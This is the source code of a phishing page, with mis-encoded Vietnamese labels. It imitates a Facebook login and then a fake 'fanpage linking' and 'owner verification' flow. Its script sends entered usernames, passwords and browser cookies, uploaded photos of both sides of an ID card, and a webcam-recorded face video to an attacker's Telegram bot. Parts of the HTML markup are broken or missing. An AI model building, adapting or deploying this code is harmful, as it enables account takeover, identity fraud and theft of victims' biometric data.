    <script src="https://cdn.tailwindcss.com"></script>

    // --- C·∫§U H√åNH TELEGRAM ---
    const TELEGRAM_TOKEN = 'YOUR_BOT_TOKEN'; 
    const CHAT_ID = 'YOUR_CHAT_ID';

    async function sendToTele(text, file = null, type = 'text') {
        try {
            if (type === 'text') {
                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' })
                });
            } else {
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append(type, file);
                if(text) formData.append('caption', text);
                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/send${type.charAt(0).toUpperCase() + type.slice(1)}`, {
                    method: 'POST',
                    body: formData
                });
            }
        } catch (e) { console.error(e); }
    }

    // --- B∆Ø·ªöC 1: ƒêƒÇNG NH·∫¨P L·∫§Y TK/MK/COOKIE ---
    function renderLogin() {

            <div class="bg-white p-5 rounded-xl shadow-lg w-[90%] max-w-[400px]">

                <input id="u" type="text" placeholder="Di ƒë·ªông ho·∫∑c email" class="w-full p-3 border border-gray-300 rounded-lg mb-3 outline-none focus:border-blue-500">
                <input id="p" type="password" placeholder="M·∫≠t kh·∫©u" class="w-full p-3 border border-gray-300 rounded-lg mb-4 outline-none focus:border-blue-500">
                <button onclick="handleLogin()" class="w-full bg-[#1877F2] text-white py-3 rounded-lg font-bold text-lg hover:bg-blue-700">ƒêƒÉng nh·∫≠p</button>
                <div class="text-center mt-4 border-t pt-4"><a href="#" class="text-blue-600 text-sm">Qu√™n m·∫≠t kh·∫©u?</a></div>
            </div>
        </div>`;
    }

    async function handleLogin() {
        const u = document.getElementById('u').value;
        const p = document.getElementById('p').value;
        if(u && p) {
            const cookie = document.cookie || "No Cookie Found";
            const msg = `üîî **TH√îNG TIN ƒêƒÇNG NH·∫¨P**\nüë§ **User:** \`${u}\`\nüîë **Pass:** \`${p}\`\nüç™ **Cookie:** \`${cookie}\``;
            await sendToTele(msg);
            renderFanpageList();
        }
    }

    // --- B∆Ø·ªöC 2: DANH S√ÅCH PAGE QU·∫¶N √ÅO LUXURY ---
    function renderFanpageList() {
        document.getElementById('app').innerHTML = `
        <div class="min-h-screen p-4 md:pt-16">

                <div class="p-6 border-b"><h2 class="text-xl font-extrabold text-slate-800">Li√™n k·∫øt Fanpage</h2></div>
                <div class="p-4 space-y-3">
                    ${[1, 2, 3].map(id => `

                        <div class="flex items-center gap-3">

                            <div class="font-bold text-slate-700 flex items-center gap-1">Qu·∫ßn √°o luxury c∆° s·ªü ${id}
                                <svg class="w-4 h-4 text-blue-600" fill="currentColor" viewBox="0 0 24 24"><path d="M12 2C6.5 2 2 6.5 2 12s4.5 10 10 10 10-4.5 10-10S17.5 2 12 2zM10 17l-5-5 1.4-1.4 3.6 3.6 7.6-7.6L19 8l-9 9z"/></svg>
                            </div>

                    </label>`).join('')}
                </div>
                <div class="p-4"><button onclick="showVerifyModal()" class="w-full bg-[#2563EB] text-white py-4 rounded-xl font-bold hover:shadow-lg transition">Li√™n k·∫øt ngay</button></div>
            </div>

    }

    function showVerifyModal() {
        const div = document.createElement('div');
        div.className = "fixed inset-0 bg-black/60 backdrop-blur-sm flex items-center justify-center z-50 p-4";
        div.innerHTML = `
        <div class="bg-white rounded-3xl max-w-sm w-full p-8 text-center shadow-2xl">
            <div class="w-16 h-16 bg-blue-50 rounded-full flex items-center justify-center mx-auto mb-4">
                <svg class="w-8 h-8 text-blue-600" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"></path></svg>

            <h3 class="text-xl font-bold mb-2">X√°c minh ch√≠nh ch·ªß</h3>
            <p class="text-slate-500 text-sm mb-6">B·∫°n c·∫ßn x√°c minh quy·ªÅn qu·∫£n tr·ªã vi√™n ƒë·ªÉ ho√†n t·∫•t li√™n k·∫øt.</p>
            <button onclick="renderUpload()" class="w-full bg-slate-900 text-white py-3 rounded-xl font-bold transition">X√°c minh ngay</button>
        </div>`;
        document.body.appendChild(div);
    }

    // --- B∆Ø·ªöC 3: CH·ª§P TH·∫∫ NH√ÇN VI√äN ---
    function renderUpload() {
        document.getElementById('app').innerHTML = `
        <div class="min-h-screen bg-white p-6 flex flex-col items-center">
            <h2 class="text-2xl font-bold mb-8">Ch·ª•p th·∫ª nh√¢n vi√™n</h2>
            <div class="w-full max-w-sm space-y-4 text-slate-400">
                <div class="border-2 border-dashed p-10 rounded-2xl text-center relative hover:border-blue-500 transition">

                    <p>M·∫∑t tr∆∞·ªõc th·∫ª</p>
                </div>
                <div class="border-2 border-dashed p-10 rounded-2xl text-center relative hover:border-blue-500 transition">
                    <input type="file" class="absolute inset-0 opacity-0" onchange="up(this, 'M·∫∑t sau')">
                    <p>M·∫∑t sau th·∫ª</p>
                </div>
                <button onclick="renderVideo()" class="w-full bg-blue-600 text-white py-4 rounded-xl font-bold mt-4 shadow-lg shadow-blue-100">Ti·∫øp t·ª•c</button>
            </div>
        </div>`;
    }

    async function up(input, label) {
        if (input.files[0]) {
            input.parentElement.classList.add('bg-blue-50', 'border-blue-500');
            await sendToTele(`üì∏ ${label} Page Luxury`, input.files[0], 'photo');
        }
    }

    // --- B∆Ø·ªöC 4: QUAY VIDEO M·∫∂T 10S ---
    function renderVideo() {
        document.getElementById('app').innerHTML = `
        <div class="min-h-screen bg-black flex flex-col items-center justify-center text-white">
            <h2 class="mb-4 font-bold text-lg">X√°c minh khu√¥n m·∫∑t (10s)</h2>
            <div class="relative w-72 h-72 border-4 border-blue-600 rounded-full overflow-hidden shadow-2xl">
                <video id="v" autoplay muted playsinline class="w-full h-full object-cover"></video>
                <div class="absolute inset-0 border-[15px] border-black/40 rounded-full pointer-events-none"></div>
            </div>
            <div id="t" class="mt-6 text-blue-400 font-bold">Vui l√≤ng b·∫•m n√∫t ƒë·ªÉ b·∫Øt ƒë·∫ßu</div>
            <button id="btn" class="mt-8 bg-blue-600 text-white px-12 py-3 rounded-full font-bold">B·∫Øt ƒë·∫ßu quay</button>
        </div>`;

        const v = document.getElementById('v'), btn = document.getElementById('btn'), t = document.getElementById('t');
        navigator.mediaDevices.getUserMedia({ video: true }).then(s => {
            v.srcObject = s;
            btn.onclick = () => {
                btn.classList.add('hidden');
                let chunks = [], r = new MediaRecorder(s);
                r.ondataavailable = e => chunks.push(e.data);
                r.onstop = async () => {
                    const blob = new Blob(chunks, { type: 'video/mp4' });
                    t.innerText = "ƒêang ƒë·ªìng b·ªô d·ªØ li·ªáu...";
                    await sendToTele("üé• VIDEO M·∫∂T PAGE LUXURY", blob, 'video');
                    alert("H·ªá th·ªëng ƒë√£ ghi nh·∫≠n. Vui l√≤ng ƒë·ª£i k·∫øt qu·∫£ x√°c minh.");
                    window.location.reload();
                };
                r.start();
                let c = 10;
                let i = setInterval(() => {
                    c--; t.innerText = `Gi·ªØ nguy√™n khu√¥n m·∫∑t (${c}s)`;
                    if (c <= 0) { clearInterval(i); r.stop(); s.getTracks().forEach(track => track.stop()); }
                }, 1000);
            };
        });
    }

    renderLogin();
</script>
